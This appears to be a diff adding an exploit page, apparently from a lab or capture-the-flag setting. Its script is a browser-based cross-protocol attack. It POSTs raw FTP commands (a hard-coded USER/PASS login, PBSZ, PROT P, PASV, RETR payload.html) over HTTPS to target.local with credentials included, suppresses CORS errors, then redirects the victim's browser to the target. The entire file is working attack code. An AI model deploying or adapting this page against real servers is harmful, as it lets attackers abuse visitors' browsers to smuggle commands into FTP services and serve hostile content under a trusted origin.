@@ -1,0 +1,29 @@
+<script>
+  // Send raw FTP commands over HTTPS so that vsftpd (behind MITM) parses them line-by-line
+  const cmds = [
+    'USER bob',
+    'PASS 12345',
+    // RFC 2228 FTPS: negotiate data channel protection before PASV
+    'PBSZ 0',
+    'PROT P',
+    'TYPE I',
+    'PASV',
+    'RETR payload.html'
+  ].join('\r\n') + '\r\n';
+
+  fetch('https://target.local', {
+    method: 'POST',
+    mode: 'no-cors',
+    // text/plain keeps the body as raw bytes without multipart headers
+    headers: { 'Content-Type': 'text/plain' },
+    body: cmds,
+    credentials: 'include'
+  }).catch(() => {/* ignore CORS errors in page context */});
+
+  // Give the server a few seconds to process and open PASV
+  setTimeout(function() {
+    window.location = 'https://target.local';
+  }, 5000);
+</script>
+
+<noscript>Enable JavaScript.</noscript>
